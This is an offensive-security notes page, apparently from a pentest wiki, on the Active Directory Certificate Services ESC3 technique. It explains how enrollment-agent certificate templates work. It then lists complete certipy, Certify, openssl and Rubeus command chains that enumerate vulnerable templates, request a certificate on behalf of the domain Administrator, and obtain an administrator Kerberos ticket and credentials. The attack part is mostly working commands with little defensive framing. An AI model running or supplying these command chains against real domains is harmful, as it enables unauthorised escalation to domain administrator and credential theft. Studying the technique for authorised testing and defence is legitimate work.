---
description: Abusing Misconfigured Enrollment Agent Templates.
---

# ESC3

### <mark style="color:yellow;">What is ESC3</mark>

Very similar to ESC1 and ESC2 but uses a different Extended Key Usage (EKU). EKU `Certificate Request Agent` enables a principal to request a certificate on behalf of another user, like an administrator to request a certificate on behalf of another user.

{% stepper %}
{% step %}
**Special template**

AD CS uses a certificate template that includes a specific identifier (OID: 1.3.6.1.4.1.311.20.2.1) for the **Certificate Request Agent** role.
{% endstep %}

{% step %}
**Enrollment Agent Certificate**

* The IT admin (enrollment agent) gets a certificate based on this template.
* This certificate allows them to request certificates for other users.
{% endstep %}

{% step %}
**Signing the Request**

The enrollment agent creates and signs a certificate request (CSR) on behalf of the user using their enrollment agent certificate.
{% endstep %}

{% step %}
**Issuing the Certificate**

The CA verifies the request and issues a certificate for the other user.
{% endstep %}
{% endstepper %}

### <mark style="color:yellow;">ESC3 Abuse from Linux</mark>

Look for a template whose EKU permits using the issued certificate as a `Certificate Request Agent`:

```bash
certipy find -u 'john@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

# In output
[!] Vulnerabilities
      ESC3                              : 'LAB.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set
```

#### Authenticate with certificate and get TGT

```bash
# Request for user
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca 'lab-LAB-DC-CA' -template 'ESC3'

# Request for administrator account
certipy-ad req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template user -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```

### <mark style="color:yellow;">ESC3 Abuse from Windows</mark>

Look for a template whose EKU permits using the issued certificate as a `Certificate Request Agent`:

```powershell
# Enumerate
.\Certify.exe find /vulnerable

# Request certificate with ESC3 
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3

# Convert cert to pfx
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request certificate on behalf of Administrator
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx

# Convert cert to pfx again
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# Get TGT as administrator
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials
```
